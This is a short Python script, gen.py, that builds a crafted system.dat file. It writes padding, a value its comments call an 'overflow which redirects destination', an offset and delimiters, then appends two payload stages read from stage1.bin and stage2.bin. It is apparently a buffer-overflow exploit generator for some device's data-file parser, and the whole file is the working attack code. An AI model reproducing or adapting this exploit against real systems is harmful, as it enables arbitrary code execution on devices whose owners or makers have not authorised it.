#!/usr/bin/env python3
from sys import argv, exit
import struct


def main():
    if len(argv) != 4:
        print("Usage: gen.py stage1.bin stage2.bin system.dat")
        return -1

    with open(argv[1], "rb") as fin:
        stage1 = fin.read()
    with open(argv[2], "rb") as fin:
        stage2 = fin.read()
    with open(argv[3], "wb") as fout:
        # write 0x38 bytes of pading
        for i in range(0, 0x38, 4):
            fout.write(struct.pack("I", 0xDEADBEEF))
        # write overflow which redirects destination
        fout.write(struct.pack("I", 0x810C0DFA))
        # write padding
        fout.write(struct.pack("I", 0xDEADBEEF))
        # write offset
        fout.write(struct.pack("I", 0x00000000))
        # write newline delimiter
        fout.write(struct.pack("H", 0x000A))
        # write dummy
        fout.write(struct.pack("H", 0x8123))
        # write stage1
        fout.write(stage1)
        # write eof
        fout.write(struct.pack("H", 0xFFFF))
        # write dummy
        fout.write(struct.pack("H", 0x8123))
        # write stage2
        fout.write(stage2)


if __name__ == "__main__":
    exit(main())
